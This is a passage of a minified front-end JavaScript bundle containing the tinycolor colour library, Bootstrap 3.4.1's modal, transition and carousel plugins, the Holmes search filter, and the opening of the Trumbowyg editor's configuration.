this._ok},getOriginalInput:function(){return this._originalInput},getFormat:function(){return this._format},getAlpha:function(){return this._a},getBrightness:function(){var t=this.toRgb();return(299*t.r+587*t.g+114*t.b)/1e3},setAlpha:function(t){return this._a=_(t),this._roundA=I(100*this._a)/100,this},toHsv:function(){var t=o(this._r,this._g,this._b);return{h:360*t.h,s:t.s,v:t.v,a:this._a}},toHsvString:function(){var t=o(this._r,this._g,this._b),e=I(360*t.h),n=I(100*t.s),i=I(100*t.v);return 1==this._a?"hsv("+e+", "+n+"%, "+i+"%)":"hsva("+e+", "+n+"%, "+i+"%, "+this._roundA+")"},toHsl:function(){var t=n(this._r,this._g,this._b);return{h:360*t.h,s:t.s,l:t.l,a:this._a}},toHslString:function(){var t=n(this._r,this._g,this._b),e=I(360*t.h),i=I(100*t.s),o=I(100*t.l);return 1==this._a?"hsl("+e+", "+i+"%, "+o+"%)":"hsla("+e+", "+i+"%, "+o+"%, "+this._roundA+")"},toHex:function(t){return s(this._r,this._g,this._b,t)},toHexString:function(t){return"#"+this.toHex(t)},toHex8:function(){return a(this._r,this._g,this._b,this._a)},toHex8String:function(){return"#"+this.toHex8()},toRgb:function(){return{r:I(this._r),g:I(this._g),b:I(this._b),a:this._a}},toRgbString:function(){return 1==this._a?"rgb("+I(this._r)+", "+I(this._g)+", "+I(this._b)+")":"rgba("+I(this._r)+", "+I(this._g)+", "+I(this._b)+", "+this._roundA+")"},toPercentageRgb:function(){return{r:I(100*k(this._r,255))+"%",g:I(100*k(this._g,255))+"%",b:I(100*k(this._b,255))+"%",a:this._a}},toPercentageRgbString:function(){return 1==this._a?"rgb("+I(100*k(this._r,255))+"%, "+I(100*k(this._g,255))+"%, "+I(100*k(this._b,255))+"%)":"rgba("+I(100*k(this._r,255))+"%, "+I(100*k(this._g,255))+"%, "+I(100*k(this._b,255))+"%, "+this._roundA+")"},toName:function(){return 0===this._a?"transparent":!(this._a<1)&&(U[s(this._r,this._g,this._b,!0)]||!1)},toFilter:function(t){var e="#"+a(this._r,this._g,this._b,this._a),n=e,i=this._gradientType?"GradientType = 1, ":"";return t&&(n=q(t).toHex8String()),"progid:DXImageTransform.Microsoft.gradient("+i+"startColorstr="+e+",endColorstr="+n+")"},toString:function(t){var e=!!t;t=t||this._format;var n=!1,i=this._a<1&&this._a>=0;return e||!i||"hex"!==t&&"hex6"!==t&&"hex3"!==t&&"name"!==t?("rgb"===t&&(n=this.toRgbString()),"prgb"===t&&(n=this.toPercentageRgbString()),"hex"!==t&&"hex6"!==t||(n=this.toHexString()),"hex3"===t&&(n=this.toHexString(!0)),"hex8"===t&&(n=this.toHex8String()),"name"===t&&(n=this.toName()),"hsl"===t&&(n=this.toHslString()),"hsv"===t&&(n=this.toHsvString()),n||this.toHexString()):"name"===t&&0===this._a?this.toName():this.toRgbString()},_applyModification:function(t,e){var n=t.apply(null,[this].concat([].slice.call(e)));return this._r=n._r,this._g=n._g,this._b=n._b,this.setAlpha(n._a),this},lighten:function(){return this._applyModification(h,arguments)},brighten:function(){return this._applyModification(d,arguments)},darken:function(){return this._applyModification(p,arguments)},desaturate:function(){return this._applyModification(l,arguments)},saturate:function(){return this._applyModification(c,arguments)},greyscale:function(){return this._applyModification(u,arguments)},spin:function(){return this._applyModification(f,arguments)},_applyCombination:function(t,e){return t.apply(null,[this].concat([].slice.call(e)))},analogous:function(){return this._applyCombination(b,arguments)},complement:function(){return this._applyCombination(m,arguments)},monochromatic:function(){return this._applyCombination(x,arguments)},splitcomplement:function(){return this._applyCombination(y,arguments)},triad:function(){return this._applyCombination(g,arguments)},tetrad:function(){return this._applyCombination(v,arguments)}},q.fromRatio=function(t,e){if("object"==typeof t){var n={};for(var i in t)t.hasOwnProperty(i)&&(n[i]="a"===i?t[i]:A(t[i]));t=n}return q(t,e)},q.equals=function(t,e){return!(!t||!e)&&q(t).toRgbString()==q(e).toRgbString()},q.random=function(){return q.fromRatio({r:H(),g:H(),b:H()})},q.mix=function(t,e,n){n=0===n?0:n||50;var i,o=q(t).toRgb(),r=q(e).toRgb(),s=n/100,a=2*s-1,l=r.a-o.a,c=1-(i=((i=a*l==-1?a:(a+l)/(1+a*l))+1)/2),u={r:r.r*i+o.r*c,g:r.g*i+o.g*c,b:r.b*i+o.b*c,a:r.a*s+o.a*(1-s)};return q(u)},q.readability=function(t,e){var n=q(t),i=q(e),o=n.toRgb(),r=i.toRgb(),s=n.getBrightness(),a=i.getBrightness(),l=Math.max(o.r,r.r)-Math.min(o.r,r.r)+Math.max(o.g,r.g)-Math.min(o.g,r.g)+Math.max(o.b,r.b)-Math.min(o.b,r.b);return{brightness:Math.abs(s-a),color:l}},q.isReadable=function(t,e){var n=q.readability(t,e);return n.brightness>125&&n.color>500},q.mostReadable=function(t,e){for(var n=null,i=0,o=!1,r=0;r<e.length;r++){var s=q.readability(t,e[r]),a=s.brightness>125&&s.color>500,l=s.brightness/125*3+s.color/500;(a&&!o||a&&o&&l>i||!a&&!o&&l>i)&&(o=a,i=l,n=q(e[r]))}return n};var F,W,z,V=q.names={aliceblue:"f0f8ff",antiquewhite:"faebd7",aqua:"0ff",aquamarine:"7fffd4",azure:"f0ffff",beige:"f5f5dc",bisque:"ffe4c4",black:"000",blanchedalmond:"ffebcd",blue:"00f",blueviolet:"8a2be2",brown:"a52a2a",burlywood:"deb887",burntsienna:"ea7e5d",cadetblue:"5f9ea0",chartreuse:"7fff00",chocolate:"d2691e",coral:"ff7f50",cornflowerblue:"6495ed",cornsilk:"fff8dc",crimson:"dc143c",cyan:"0ff",darkblue:"00008b",darkcyan:"008b8b",darkgoldenrod:"b8860b",darkgray:"a9a9a9",darkgreen:"006400",darkgrey:"a9a9a9",darkkhaki:"bdb76b",darkmagenta:"8b008b",darkolivegreen:"556b2f",darkorange:"ff8c00",darkorchid:"9932cc",darkred:"8b0000",darksalmon:"e9967a",darkseagreen:"8fbc8f",darkslateblue:"483d8b",darkslategray:"2f4f4f",darkslategrey:"2f4f4f",darkturquoise:"00ced1",darkviolet:"9400d3",deeppink:"ff1493",deepskyblue:"00bfff",dimgray:"696969",dimgrey:"696969",dodgerblue:"1e90ff",firebrick:"b22222",floralwhite:"fffaf0",forestgreen:"228b22",fuchsia:"f0f",gainsboro:"dcdcdc",ghostwhite:"f8f8ff",gold:"ffd700",goldenrod:"daa520",gray:"808080",green:"008000",greenyellow:"adff2f",grey:"808080",honeydew:"f0fff0",hotpink:"ff69b4",indianred:"cd5c5c",indigo:"4b0082",ivory:"fffff0",khaki:"f0e68c",lavender:"e6e6fa",lavenderblush:"fff0f5",lawngreen:"7cfc00",lemonchiffon:"fffacd",lightblue:"add8e6",lightcoral:"f08080",lightcyan:"e0ffff",lightgoldenrodyellow:"fafad2",lightgray:"d3d3d3",lightgreen:"90ee90",lightgrey:"d3d3d3",lightpink:"ffb6c1",lightsalmon:"ffa07a",lightseagreen:"20b2aa",lightskyblue:"87cefa",lightslategray:"789",lightslategrey:"789",lightsteelblue:"b0c4de",lightyellow:"ffffe0",lime:"0f0",limegreen:"32cd32",linen:"faf0e6",magenta:"f0f",maroon:"800000",mediumaquamarine:"66cdaa",mediumblue:"0000cd",mediumorchid:"ba55d3",mediumpurple:"9370db",mediumseagreen:"3cb371",mediumslateblue:"7b68ee",mediumspringgreen:"00fa9a",mediumturquoise:"48d1cc",mediumvioletred:"c71585",midnightblue:"191970",mintcream:"f5fffa",mistyrose:"ffe4e1",moccasin:"ffe4b5",navajowhite:"ffdead",navy:"000080",oldlace:"fdf5e6",olive:"808000",olivedrab:"6b8e23",orange:"ffa500",orangered:"ff4500",orchid:"da70d6",palegoldenrod:"eee8aa",palegreen:"98fb98",paleturquoise:"afeeee",palevioletred:"db7093",papayawhip:"ffefd5",peachpuff:"ffdab9",peru:"cd853f",pink:"ffc0cb",plum:"dda0dd",powderblue:"b0e0e6",purple:"800080",rebeccapurple:"663399",red:"f00",rosybrown:"bc8f8f",royalblue:"4169e1",saddlebrown:"8b4513",salmon:"fa8072",sandybrown:"f4a460",seagreen:"2e8b57",seashell:"fff5ee",sienna:"a0522d",silver:"c0c0c0",skyblue:"87ceeb",slateblue:"6a5acd",slategray:"708090",slategrey:"708090",snow:"fffafa",springgreen:"00ff7f",steelblue:"4682b4",tan:"d2b48c",teal:"008080",thistle:"d8bfd8",tomato:"ff6347",turquoise:"40e0d0",violet:"ee82ee",wheat:"f5deb3",white:"fff",whitesmoke:"f5f5f5",yellow:"ff0",yellowgreen:"9acd32"},U=q.hexNames=function w(t){var e={};for(var n in t)t.hasOwnProperty(n)&&(e[t[n]]=n);return e}(V),X=(W="[\\s|\\(]+("+(F="(?:[-\\+]?\\d*\\.\\d+%?)|(?:[-\\+]?\\d+%?)")+")[,|\\s]+("+F+")[,|\\s]+("+F+")\\s*\\)?",z="[\\s|\\(]+("+F+")[,|\\s]+("+F+")[,|\\s]+("+F+")[,|\\s]+("+F+")\\s*\\)?",{rgb:new RegExp("rgb"+W),rgba:new RegExp("rgba"+z),hsl:new RegExp("hsl"+W),hsla:new RegExp("hsla"+z),hsv:new RegExp("hsv"+W),hsva:new RegExp("hsva"+z),hex3:/^([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,hex6:/^([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/,hex8:/^([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/});window.tinycolor=q}(),t((function(){t.fn.spectrum.load&&t.fn.spectrum.processNativeColorInputs()}))})),function(t){"use strict";function e(e,i){return this.each((function(){var o=t(this),r=o.data("bs.modal"),s=t.extend({},n.DEFAULTS,o.data(),"object"==typeof e&&e);r||o.data("bs.modal",r=new n(this,s)),"string"==typeof e?r[e](i):s.show&&r.show(i)}))}var n=function(e,n){this.options=n,this.$body=t(document.body),this.$element=t(e),this.$dialog=this.$element.find(".modal-dialog"),this.$backdrop=null,this.isShown=null,this.originalBodyPad=null,this.scrollbarWidth=0,this.ignoreBackdropClick=!1,this.fixedContent=".navbar-fixed-top, .navbar-fixed-bottom",this.options.remote&&this.$element.find(".modal-content").load(this.options.remote,t.proxy((function(){this.$element.trigger("loaded.bs.modal")}),this))};n.VERSION="3.4.1",n.TRANSITION_DURATION=300,n.BACKDROP_TRANSITION_DURATION=150,n.DEFAULTS={backdrop:!0,keyboard:!0,show:!0},n.prototype.toggle=function(t){return this.isShown?this.hide():this.show(t)},n.prototype.show=function(e){var i=this,o=t.Event("show.bs.modal",{relatedTarget:e});this.$element.trigger(o),this.isShown||o.isDefaultPrevented()||(this.isShown=!0,this.checkScrollbar(),this.setScrollbar(),this.$body.addClass("modal-open"),this.escape(),this.resize(),this.$element.on("click.dismiss.bs.modal",'[data-dismiss="modal"]',t.proxy(this.hide,this)),this.$dialog.on("mousedown.dismiss.bs.modal",(function(){i.$element.one("mouseup.dismiss.bs.modal",(function(e){t(e.target).is(i.$element)&&(i.ignoreBackdropClick=!0)}))})),this.backdrop((function(){var o=t.support.transition&&i.$element.hasClass("fade");i.$element.parent().length||i.$element.appendTo(i.$body),i.$element.show().scrollTop(0),i.adjustDialog(),o&&i.$element[0].offsetWidth,i.$element.addClass("in"),i.enforceFocus();var r=t.Event("shown.bs.modal",{relatedTarget:e});o?i.$dialog.one("bsTransitionEnd",(function(){i.$element.trigger("focus").trigger(r)})).emulateTransitionEnd(n.TRANSITION_DURATION):i.$element.trigger("focus").trigger(r)})))},n.prototype.hide=function(e){e&&e.preventDefault(),e=t.Event("hide.bs.modal"),this.$element.trigger(e),this.isShown&&!e.isDefaultPrevented()&&(this.isShown=!1,this.escape(),this.resize(),t(document).off("focusin.bs.modal"),this.$element.removeClass("in").off("click.dismiss.bs.modal").off("mouseup.dismiss.bs.modal"),this.$dialog.off("mousedown.dismiss.bs.modal"),t.support.transition&&this.$element.hasClass("fade")?this.$element.one("bsTransitionEnd",t.proxy(this.hideModal,this)).emulateTransitionEnd(n.TRANSITION_DURATION):this.hideModal())},n.prototype.enforceFocus=function(){t(document).off("focusin.bs.modal").on("focusin.bs.modal",t.proxy((function(t){document===t.target||this.$element[0]===t.target||this.$element.has(t.target).length||this.$element.trigger("focus")}),this))},n.prototype.escape=function(){this.isShown&&this.options.keyboard?this.$element.on("keydown.dismiss.bs.modal",t.proxy((function(t){27==t.which&&this.hide()}),this)):this.isShown||this.$element.off("keydown.dismiss.bs.modal")},n.prototype.resize=function(){this.isShown?t(window).on("resize.bs.modal",t.proxy(this.handleUpdate,this)):t(window).off("resize.bs.modal")},n.prototype.hideModal=function(){var t=this;this.$element.hide(),this.backdrop((function(){t.$body.removeClass("modal-open"),t.resetAdjustments(),t.resetScrollbar(),t.$element.trigger("hidden.bs.modal")}))},n.prototype.removeBackdrop=function(){this.$backdrop&&this.$backdrop.remove(),this.$backdrop=null},n.prototype.backdrop=function(e){var i=this,o=this.$element.hasClass("fade")?"fade":"";if(this.isShown&&this.options.backdrop){var r=t.support.transition&&o;if(this.$backdrop=t(document.createElement("div")).addClass("modal-backdrop "+o).appendTo(this.$body),this.$element.on("click.dismiss.bs.modal",t.proxy((function(t){this.ignoreBackdropClick?this.ignoreBackdropClick=!1:t.target===t.currentTarget&&("static"==this.options.backdrop?this.$element[0].focus():this.hide())}),this)),r&&this.$backdrop[0].offsetWidth,this.$backdrop.addClass("in"),!e)return;r?this.$backdrop.one("bsTransitionEnd",e).emulateTransitionEnd(n.BACKDROP_TRANSITION_DURATION):e()}else if(!this.isShown&&this.$backdrop){this.$backdrop.removeClass("in");var s=function(){i.removeBackdrop(),e&&e()};t.support.transition&&this.$element.hasClass("fade")?this.$backdrop.one("bsTransitionEnd",s).emulateTransitionEnd(n.BACKDROP_TRANSITION_DURATION):s()}else e&&e()},n.prototype.handleUpdate=function(){this.adjustDialog()},n.prototype.adjustDialog=function(){var t=this.$element[0].scrollHeight>document.documentElement.clientHeight;this.$element.css({paddingLeft:!this.bodyIsOverflowing&&t?this.scrollbarWidth:"",paddingRight:this.bodyIsOverflowing&&!t?this.scrollbarWidth:""})},n.prototype.resetAdjustments=function(){this.$element.css({paddingLeft:"",paddingRight:""})},n.prototype.checkScrollbar=function(){var t=window.innerWidth;if(!t){var e=document.documentElement.getBoundingClientRect();t=e.right-Math.abs(e.left)}this.bodyIsOverflowing=document.body.clientWidth<t,this.scrollbarWidth=this.measureScrollbar()},n.prototype.setScrollbar=function(){var e=parseInt(this.$body.css("padding-right")||0,10);this.originalBodyPad=document.body.style.paddingRight||"";var n=this.scrollbarWidth;this.bodyIsOverflowing&&(this.$body.css("padding-right",e+n),t(this.fixedContent).each((function(e,i){var o=i.style.paddingRight,r=t(i).css("padding-right");t(i).data("padding-right",o).css("padding-right",parseFloat(r)+n+"px")})))},n.prototype.resetScrollbar=function(){this.$body.css("padding-right",this.originalBodyPad),t(this.fixedContent).each((function(e,n){var i=t(n).data("padding-right");t(n).removeData("padding-right"),n.style.paddingRight=i||""}))},n.prototype.measureScrollbar=function(){var t=document.createElement("div");t.className="modal-scrollbar-measure",this.$body.append(t);var e=t.offsetWidth-t.clientWidth;return this.$body[0].removeChild(t),e};var i=t.fn.modal;t.fn.modal=e,t.fn.modal.Constructor=n,t.fn.modal.noConflict=function(){return t.fn.modal=i,this},t(document).on("click.bs.modal.data-api",'[data-toggle="modal"]',(function(n){var i=t(this),o=i.attr("href"),r=i.attr("data-target")||o&&o.replace(/.*(?=#[^\s]+$)/,""),s=t(document).find(r),a=s.data("bs.modal")?"toggle":t.extend({remote:!/#/.test(o)&&o},s.data(),i.data());i.is("a")&&n.preventDefault(),s.one("show.bs.modal",(function(t){t.isDefaultPrevented()||s.one("hidden.bs.modal",(function(){i.is(":visible")&&i.trigger("focus")}))})),e.call(s,a,this)}))}(jQuery),function(t){"use strict";t.fn.emulateTransitionEnd=function(e){var n=!1,i=this;return t(this).one("bsTransitionEnd",(function(){n=!0})),setTimeout((function(){n||t(i).trigger(t.support.transition.end)}),e),this},t((function(){t.support.transition=function e(){var t=document.createElement("bootstrap"),e={WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"oTransitionEnd otransitionend",transition:"transitionend"};for(var n in e)if(void 0!==t.style[n])return{end:e[n]};return!1}(),t.support.transition&&(t.event.special.bsTransitionEnd={bindType:t.support.transition.end,delegateType:t.support.transition.end,handle:function(e){if(t(e.target).is(this))return e.handleObj.handler.apply(this,arguments)}})}))}(jQuery),function(t){"use strict";function e(e){return this.each((function(){var i=t(this),o=i.data("bs.carousel"),r=t.extend({},n.DEFAULTS,i.data(),"object"==typeof e&&e),s="string"==typeof e?e:r.slide;o||i.data("bs.carousel",o=new n(this,r)),"number"==typeof e?o.to(e):s?o[s]():r.interval&&o.pause().cycle()}))}var n=function(e,n){this.$element=t(e),this.$indicators=this.$element.find(".carousel-indicators"),this.options=n,this.paused=null,this.sliding=null,this.interval=null,this.$active=null,this.$items=null,this.options.keyboard&&this.$element.on("keydown.bs.carousel",t.proxy(this.keydown,this)),"hover"==this.options.pause&&!("ontouchstart"in document.documentElement)&&this.$element.on("mouseenter.bs.carousel",t.proxy(this.pause,this)).on("mouseleave.bs.carousel",t.proxy(this.cycle,this))};n.VERSION="3.4.1",n.TRANSITION_DURATION=600,n.DEFAULTS={interval:5e3,pause:"hover",wrap:!0,keyboard:!0},n.prototype.keydown=function(t){if(!/input|textarea/i.test(t.target.tagName)){switch(t.which){case 37:this.prev();break;case 39:this.next();break;default:return}t.preventDefault()}},n.prototype.cycle=function(e){return e||(this.paused=!1),this.interval&&clearInterval(this.interval),this.options.interval&&!this.paused&&(this.interval=setInterval(t.proxy(this.next,this),this.options.interval)),this},n.prototype.getItemIndex=function(t){return this.$items=t.parent().children(".item"),this.$items.index(t||this.$active)},n.prototype.getItemForDirection=function(t,e){var n=this.getItemIndex(e);if(("prev"==t&&0===n||"next"==t&&n==this.$items.length-1)&&!this.options.wrap)return e;var i=(n+("prev"==t?-1:1))%this.$items.length;return this.$items.eq(i)},n.prototype.to=function(t){var e=this,n=this.getItemIndex(this.$active=this.$element.find(".item.active"));if(!(t>this.$items.length-1||t<0))return this.sliding?this.$element.one("slid.bs.carousel",(function(){e.to(t)})):n==t?this.pause().cycle():this.slide(t>n?"next":"prev",this.$items.eq(t))},n.prototype.pause=function(e){return e||(this.paused=!0),this.$element.find(".next, .prev").length&&t.support.transition&&(this.$element.trigger(t.support.transition.end),this.cycle(!0)),this.interval=clearInterval(this.interval),this},n.prototype.next=function(){if(!this.sliding)return this.slide("next")},n.prototype.prev=function(){if(!this.sliding)return this.slide("prev")},n.prototype.slide=function(e,i){var o=this.$element.find(".item.active"),r=i||this.getItemForDirection(e,o),s=this.interval,a="next"==e?"left":"right",l=this;if(r.hasClass("active"))return this.sliding=!1;var c=r[0],u=t.Event("slide.bs.carousel",{relatedTarget:c,direction:a});if(this.$element.trigger(u),!u.isDefaultPrevented()){if(this.sliding=!0,s&&this.pause(),this.$indicators.length){this.$indicators.find(".active").removeClass("active");var h=t(this.$indicators.children()[this.getItemIndex(r)]);h&&h.addClass("active")}var d=t.Event("slid.bs.carousel",{relatedTarget:c,direction:a});return t.support.transition&&this.$element.hasClass("slide")?(r.addClass(e),"object"==typeof r&&r.length&&r[0].offsetWidth,o.addClass(a),r.addClass(a),o.one("bsTransitionEnd",(function(){r.removeClass([e,a].join(" ")).addClass("active"),o.removeClass(["active",a].join(" ")),l.sliding=!1,setTimeout((function(){l.$element.trigger(d)}),0)})).emulateTransitionEnd(n.TRANSITION_DURATION)):(o.removeClass("active"),r.addClass("active"),this.sliding=!1,this.$element.trigger(d)),s&&this.cycle(),this}};var i=t.fn.carousel;t.fn.carousel=e,t.fn.carousel.Constructor=n,t.fn.carousel.noConflict=function(){return t.fn.carousel=i,this};var o=function(n){var i=t(this),o=i.attr("href");o&&(o=o.replace(/.*(?=#[^\s]+$)/,""));var r=i.attr("data-target")||o,s=t(document).find(r);if(s.hasClass("carousel")){var a=t.extend({},s.data(),i.data()),l=i.attr("data-slide-to");l&&(a.interval=!1),e.call(s,a),l&&s.data("bs.carousel").to(l),n.preventDefault()}};t(document).on("click.bs.carousel.data-api","[data-slide]",o).on("click.bs.carousel.data-api","[data-slide-to]",o),t(window).on("load",(function(){t('[data-ride="carousel"]').each((function(){var n=t(this);e.call(n,n.data())}))}))}(jQuery),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.holmes=e()}(this,(function(){"use strict";var t="undefined"==typeof window?global:window,e=function(t,e){return-1!==t.indexOf(e)},n="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},i=(function(){function t(t){this.value=t}function e(e){function n(o,r){try{var s=e[o](r),a=s.value;a instanceof t?Promise.resolve(a.value).then((function(t){n("next",t)}),(function(t){n("throw",t)})):i(s.done?"return":"normal",s.value)}catch(t){i("throw",t)}}function i(t,e){"return"===t?o.resolve({value:e,done:!0}):"throw"===t?o.reject(e):o.resolve({value:e,done:!1}),(o=o.next)?n(o.key,o.arg):r=null}var o,r;this._invoke=function(t,e){return new Promise((function(i,s){var a={key:t,arg:e,resolve:i,reject:s,next:null};r?r=r.next=a:(o=r=a,n(t,e))}))},"function"!=typeof e.return&&(this.return=void 0)}"function"==typeof Symbol&&Symbol.asyncIterator&&(e.prototype[Symbol.asyncIterator]=function(){return this}),e.prototype.next=function(t){return this._invoke("next",t)},e.prototype.throw=function(t){return this._invoke("throw",t)},e.prototype.return=function(t){return this._invoke("return",t)}}(),function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}),o=function(){function t(t,e){for(var n,i=0;i<e.length;i++)(n=e[i]).enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(t,n.key,n)}return function(e,n,i){return n&&t(e.prototype,n),i&&t(e,i),e}}(),r_invalidInput="The Holmes input was no <input> or contenteditable.",r_optionsObject='The options need to be given inside an object like this:\n\nnew Holmes({\n  find:".result"\n});\n\nsee also https://haroen.me/holmes/doc/holmes.html',r_findOption='A find argument is needed. That should be a querySelectorAll for each of the items you want to match individually. You should have something like:\n\nnew Holmes({\n  find:".result"\n});\n\nsee also https://haroen.me/holmes/doc/holmes.html',r_noInput="Your Holmes.input didn't match a querySelector",r_impossiblePlaceholder="The Holmes placeholder couldn't be put; the elements had no parent.",s=function(){function t(o){var s=this;i(this,t);var a=!1;if("object"!==(void 0===o?"undefined":n(o)))throw new Error(r_optionsObject);if("string"!=typeof o.find)throw new Error(r_findOption);var l={input:"input[type=search]",find:"",placeholder:void 0,mark:!1,class:{visible:void 0,hidden:"hidden"},dynamic:!1,minCharacters:0,hiddenAttr:!1,shouldShow:e,onHidden:void 0,onVisible:void 0,onEmpty:void 0,onFound:void 0,onInput:void 0};this.options=Object.assign({},l,o),this.options.class=Object.assign({},l.class,o.class),this.hidden=0,this.running=!1,window.addEventListener("DOMContentLoaded",(function(){return s.start()})),this.search=function(){s.running=!0;var t=!1;s.searchString=s.inputString(),s.options.minCharacters&&0!==s.searchString.length&&s.options.minCharacters>s.searchString.length||(s.options.dynamic&&(s.elements=document.querySelectorAll(s.options.find),s.elementsLength=s.elements.length,s.elementsArray=Array.prototype.slice.call(s.elements)),s.options.mark&&(s._regex=new RegExp("("+s.searchString+")(?![^<]*>)","gi")),s.elementsArray.forEach((function(e){s.options.shouldShow(e.textContent.toLowerCase(),s.searchString)?(s._showElement(e),a&&"function"==typeof s.options.onFound&&s.options.onFound(s.placeholderNode),t=!0):s._hideElement(e)})),"function"==typeof s.options.onInput&&s.options.onInput(s.searchString),t?s.options.placeholder&&s._hideElement(s.placeholderNode):(s.options.placeholder&&s._showElement(s.placeholderNode),0==a&&(a=!0,"function"==typeof s.options.onEmpty&&s.options.onEmpty(s.placeholderNode))))}}return o(t,[{key:"_hideElement",value:function(t){this.options.class.visible&&t.classList.remove(this.options.class.visible),t.classList.contains(this.options.class.hidden)||(t.classList.add(this.options.class.hidden),this.hidden++,"function"==typeof this.options.onHidden&&this.options.onHidden(t)),this.options.hiddenAttr&&t.setAttribute("hidden","true"),this.options.mark&&(t.innerHTML=t.innerHTML.replace(/<\/?mark>/g,""))}},{key:"_showElement",value:function(t){this.options.class.visible&&t.classList.add(this.options.class.visible),t.classList.contains(this.options.class.hidden)&&(t.classList.remove(this.options.class.hidden),this.hidden--,"function"==typeof this.options.onVisible&&this.options.onVisible(t)),this.options.hiddenAttr&&t.removeAttribute("hidden"),this.options.mark&&(t.innerHTML=t.innerHTML.replace(/<\/?mark>/g,""),this.searchString.length&&(t.innerHTML=t.innerHTML.replace(this._regex,"<mark>$1</mark>")))}},{key:"_inputHandler",value:function(){console.warn("You can now directly call .search() to refresh the results"),this.search()}},{key:"inputString",value:function(){if(this.input instanceof HTMLInputElement)return this.input.value.toLowerCase();if(this.input.isContentEditable)return this.input.textContent.toLowerCase();throw new Error(r_invalidInput)}},{key:"setInput",value:function(t){if(this.input instanceof HTMLInputElement)this.input.value=t;else{if(!this.input.isContentEditable)throw new Error(r_invalidInput);this.input.textContent=t}}},{key:"start",value:function(){var t=document.querySelector(this.options.input);if(!(t instanceof HTMLElement))throw new Error(r_noInput);if(this.input=t,"string"!=typeof this.options.find)throw new Error(r_findOption);if(this.elements=document.querySelectorAll(this.options.find),this.elementsLength=this.elements.length,this.elementsArray=Array.prototype.slice.call(this.elements),this.hidden=0,"string"==typeof this.options.placeholder){var e=this.options.placeholder;if(this.placeholderNode=document.createElement("div"),this.placeholderNode.id="holmes-placeholder",this._hideElement(this.placeholderNode),this.placeholderNode.innerHTML=e,!(this.elements[0].parentNode instanceof Element))throw new Error(r_impossiblePlaceholder);this.elements[0].parentNode.appendChild(this.placeholderNode)}if(this.options.class.visible){var n=this.options.class.visible;this.elementsArray.forEach((function(t){t.classList.add(n)}))}this.input.addEventListener("input",this.search)}},{key:"stop",value:function(){var t=this;return new Promise((function(e,n){try{t.input.removeEventListener("input",t.search),t.options.placeholder&&(t.placeholderNode.parentNode?t.placeholderNode.parentNode.removeChild(t.placeholderNode):n(new Error(r_impossiblePlaceholder))),t.options.mark&&t.elementsArray.forEach((function(t){t.innerHTML=t.innerHTML.replace(/<\/?mark>/g,"")})),t.running=!1,e("This instance of Holmes has been stopped.")}catch(s){n(s)}}))}},{key:"clear",value:function(){var t=this;this.setInput(""),this.elementsArray.forEach((function(e){t._showElement(e)})),this.options.placeholder&&this._hideElement(this.placeholderNode),this.hidden=0}},{key:"count",value:function(){return{all:this.elementsLength,hidden:this.hidden,visible:this.elementsLength-this.hidden}}}]),t}();return function(e){var n=function(){for(var n=arguments.length,i=Array(n),o=0;o<n;o++)i[o]=arguments[o];return void 0!==this&&this!==t?e.call.apply(e,[this].concat(i)):new(Function.prototype.bind.apply(e,[null].concat(i)))};return n.__proto__=e,n.prototype=e.prototype,n}(s)})),jQuery.trumbowyg={langs:{en:{viewHTML:"View HTML",undo:"Undo",redo:"Redo",formatting:"Formatting",p:"Paragraph",blockquote:"Quote",code:"Code",header:"Header",bold:"Bold",italic:"Italic",strikethrough:"Strikethrough",underline:"Underline",strong:"Strong",em:"Emphasis",del:"Deleted",superscript:"Superscript",subscript:"Subscript",unorderedList:"Unordered list",orderedList:"Ordered list",insertImage:"Insert Image",link:"Link",createLink:"Insert link",unlink:"Remove link",_self:"Same tab (default)",_blank:"New tab",justifyLeft:"Align Left",justifyCenter:"Align Center",justifyRight:"Align Right",justifyFull:"Align Justify",horizontalRule:"Insert horizontal rule",removeformat:"Remove format",fullscreen:"Fullscreen",close:"Close",submit:"Confirm",reset:"Cancel",required:"Required",description:"Description",title:"Title",text:"Text",target:"Target",width:"Width"}},plugins:{},svgPath:null,svgAbsoluteUseHref:!1,hideButtonTexts:null},Object.defineProperty(jQuery.trumbowyg,"defaultOptions",{value:{lang:"en",fixedBtnPane:!1,fixedFullWidth:!1,autogrow:!1,autogrowOnEnter:!1,imageWidthModalEdit:!1,hideButtonTexts:null,prefix:"trumbowyg-",tagClasses:{},semantic:!0,semanticKeepAttributes:!1,resetCss:!1,removeformatPasted:!1,tabToIndent:!1,tagsToRemove:[],tagsToKeep:["hr","img","embed","iframe","input"],btns:[["viewHTML"],["undo","redo"],["formatting"],["strong","em","del"],["superscript","subscript"],["link"],["insertImage"],["justifyLeft","justifyCenter","justifyRight","justifyFull"],["unorderedList","orderedList"],["horizontalRule"],["removeformat"],["fullscreen"]],btnsDef:{},changeActiveDropdownIcon:!1,inlineElementsSelector:"a,abbr,acronym,b,caption,cite,code,col,dfn,dir,dt,dd,em,font,hr,i,kbd,li,q,span,strikeout,strong,sub,sup,u",pasteHandlers:[],plugins:{},urlProtocol:!1,minimalLinks:!1,linkTargets:["_self","_blank"],svgPath:null},writable:!1,enumerable:!0,configurable:!1}),function(t,e,n,i){"use strict";var o="tbwconfirm",r="tbwcancel";i.fn.trumbowyg=function(t,e){var n="trumbowyg";if(t===Object(t)||!t)return this.each((function(){i(this).data(n)||i(this).data(n,new s(this,t))}));if(1===this.length)try{var o=i(this).data(n);switch(t){case"execCmd":return o.execCmd(e.cmd,e.param,e.forceCss,e.skipTrumbowyg);case"openModal":return o.openModal(e.title,e.content);case"closeModal":return o.closeModal();case"openModalInsert":return o.openModalInsert(e.title,e.fields,e.callback);case"saveRange":return o.saveRange();case"getRange":return o.range;case"getRangeText":return o.getRangeText();case"restoreRange":return o.restoreRange();case"enable":return o.setDisabled(!1);case"disable":return o.setDisabled(!0);case"toggle":return o.toggle();case"destroy":return o.destroy();case"empty":return o.empty();case"html":return 